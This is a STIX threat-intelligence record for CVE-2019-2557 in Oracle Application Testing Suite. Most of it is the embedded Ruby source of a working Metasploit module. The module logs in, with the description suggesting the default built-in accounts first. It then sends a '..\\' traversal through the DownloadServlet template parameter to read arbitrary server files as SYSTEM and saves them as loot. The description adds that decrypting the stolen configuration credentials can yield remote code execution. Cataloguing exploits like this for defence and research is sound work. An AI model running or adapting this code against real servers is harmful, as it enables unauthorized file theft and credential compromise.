{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15302600-2b77-4b05-a3d1-d4a85371f88e",
    "created": "2024-08-14T16:32:49.250425Z",
    "modified": "2024-08-14T16:32:49.250428Z",
    "name": "Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal",
    "description": " This module exploits a vulnerability in Oracle Application Testing Suite (OATS). In the Load Testing interface, a remote user can abuse the custom report template selector, and cause the DownloadServlet class to read any file on the server as SYSTEM. Since the Oracle application contains multiple configuration files that include encrypted credentials, and that there are public resources for decryption, it is actually possible to gain remote code execution by leveraging this directory traversal attack.  Please note that authentication is required. By default, OATS has two built-in accounts: default and administrator. You could try to target those first.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/oats_downloadservlet_traversal.rb",
            "external_id": "oats_downloadservlet_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-2557"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2019-0033/"
        },
        {
            "source_name": "reference",
            "url": "https://www.oracle.com/security-alerts/cpuapr2019.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rkelly'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal',\n      'Description'    => %q{\n        This module exploits a vulnerability in Oracle Application Testing Suite (OATS). In the Load\n        Testing interface, a remote user can abuse the custom report template selector, and cause the\n        DownloadServlet class to read any file on the server as SYSTEM. Since the Oracle application\n        contains multiple configuration files that include encrypted credentials, and that there are\n        public resources for decryption, it is actually possible to gain remote code execution\n        by leveraging this directory traversal attack.\n\n        Please note that authentication is required. By default, OATS has two built-in accounts:\n        default and administrator. You could try to target those first.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Steven Seeley', # Original discovery\n          'sinn3r'         # Metasploit module\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8088\n        },\n      'References'     =>\n        [\n          ['CVE', '2019-2557'],\n          ['URL', 'https://srcincite.io/advisories/src-2019-0033/'],\n          ['URL', 'https://www.oracle.com/security-alerts/cpuapr2019.html']\n        ],\n      'DisclosureDate' => '2019-04-16'\n    ))\n\n    register_options(\n      [\n        OptString.new('FILE', [true, 'The name of the file to download', 'oats-config.xml']),\n        OptInt.new('DEPTH', [true, 'The max traversal depth', 1]),\n        OptString.new('OATSUSERNAME', [true, 'The username to use for Oracle', 'default']),\n        OptString.new('OATSPASSWORD', [true, 'The password to use for Oracle']),\n      ])\n  end\n\n  class OracleAuthSpec\n    attr_accessor :loop_value\n    attr_accessor :afr_window_id\n    attr_accessor :adf_window_id\n    attr_accessor :adf_ads_page_id\n    attr_accessor :adf_page_id\n    attr_accessor :form_value\n    attr_accessor :session_id\n    attr_accessor :view_direct\n    attr_accessor :view_state\n  end\n\n  # OATS ships LoadTest500VU_Build1 and LoadTest500VU_Build2 by default,\n  # and there is no way to remove it from the user interface, so this should be\n  # safe to say that there will always there.\n  DEFAULT_SESSION = 'LoadTest500VU_Build1'\n\n  def auth_spec\n    @auth_spec ||= OracleAuthSpec.new\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'olt/')\n    })\n\n    if res && res.body.include?('AdfLoopbackUtils.runLoopback')\n      Exploit::CheckCode::Detected\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def load_runloopback_args(res)\n    html = res.get_html_document\n    rk = RKelly::Parser.new\n    script = html.at('script').text\n    ast = rk.parse(script)\n    runloopback = ast.grep(RKelly::Nodes::ExpressionStatementNode).last\n    runloopback_args = runloopback.value.arguments.value\n    auth_spec.loop_value = runloopback_args[2].value.scan(/'(.+)'/).flatten.first\n    auth_spec.afr_window_id = runloopback_args[7].value.scan(/'(.+)'/).flatten.first\n\n    json_args = runloopback_args[17]\n    auth_spec.adf_window_id = json_args.value[4].value.value.to_s\n    auth_spec.adf_page_id = json_args.value[5].value.value.to_s\n  end\n\n  def load_view_redirect_value(res)\n    html = res.get_html_document\n    rk = RKelly::Parser.new\n    script = html.at('script').text\n    ast = rk.parse(script)\n    runredirect = ast.grep(RKelly::Nodes::ExpressionStatementNode).last\n    runredirect_args = runredirect.value.arguments.value\n    redirect_arg = runredirect_args[1].value.scan(/'(.+)'/).flatten.first || ''\n    auth_spec.view_direct = redirect_arg.scan(/ORA_ADF_VIEW_REDIRECT=(\\d+);/).flatten.first\n    auth_spec.adf_page_id = redirect_arg.scan(/ORA_ADF_VIEW_PAGE_ID=(s\\d+);/).flatten.first\n  end\n\n  def collect_initial_spec\n    uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n    })\n\n    fail_with(Failure::Unknown, 'No response from server') unless res\n    cookies = res.get_cookies\n    session_id = cookies.scan(/JSESSIONID=(.+);/i).flatten.first || ''\n    auth_spec.session_id = session_id\n    load_runloopback_args(res)\n  end\n\n  def prepare_auth_spec\n    collect_initial_spec\n    uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n      'cookie' => \"JSESSIONID=#{auth_spec.session_id}\",\n      'vars_get' =>\n        {\n          '_afrLoop' => auth_spec.loop_value,\n          '_afrWindowMode' => '0',\n          'Adf-Window-Id' => auth_spec.adf_window_id\n        },\n      'headers' =>\n        {\n          'Upgrade-Insecure-Requests' => '1'\n        }\n    })\n\n    fail_with(Failure::Unknown, 'No response from server') unless res\n    hidden_inputs = res.get_hidden_inputs.first\n    auth_spec.form_value = hidden_inputs['org.apache.myfaces.trinidad.faces.FORM']\n    auth_spec.view_state = hidden_inputs['javax.faces.ViewState']\n  end\n\n  def ota_login!\n    prepare_auth_spec\n    uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'cookie' => \"JSESSIONID=#{auth_spec.session_id}\",\n      'headers' =>\n        {\n          'Upgrade-Insecure-Requests' => '1'\n        },\n      'vars_post' =>\n        {\n          'userName' => datastore['OATSUSERNAME'],\n          'password' => datastore['OATSPASSWORD'],\n          'org.apache.myfaces.trinidad.faces.FORM' => auth_spec.form_value,\n          'Adf-Window-Id' => auth_spec.adf_window_id,\n          'javax.faces.ViewState' => auth_spec.view_state,\n          'Adf-Page-Id' => auth_spec.adf_page_id,\n          'event' => 'btnSubmit',\n          'event.btnSubmit' => '<m xmlns=\"http://oracle.com/richClient/comm\"><k v=\"type\"><s>action</s></k></m>'\n        }\n    })\n\n    fail_with(Failure::Unknown, 'No response from server') unless res\n    if res.body.include?('Login failed')\n      fail_with(Failure::NoAccess, 'Login failed')\n    else\n      store_valid_credential(user: datastore['OATSUSERNAME'], private: datastore['OATSPASSWORD'])\n      load_view_redirect_value(res)\n    end\n  end\n\n  def load_file\n    uri = normalize_uri(target_uri.path, 'olt', 'download')\n    dots = '..\\\\' * datastore['DEPTH']\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n      'cookie' => \"JSESSIONID=#{auth_spec.session_id}\",\n      'vars_get' =>\n        {\n          'type' => 'template',\n          'session' => DEFAULT_SESSION,\n          'name' => \"#{dots}#{datastore['FILE']}\"\n        },\n      'headers' =>\n        {\n          'Upgrade-Insecure-Requests' => '1'\n        }\n    })\n\n    fail_with(Failure::Unknown, 'No response from server') unless res\n    fail_with(Failure::Unknown, 'File not found') if res.body.include?('No content to display')\n    res.body\n  end\n\n  def run\n    ota_login!\n    file = load_file\n    print_line(file)\n    store_loot('oats.file', 'application/octet-stream', rhost, file)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-04-16"
}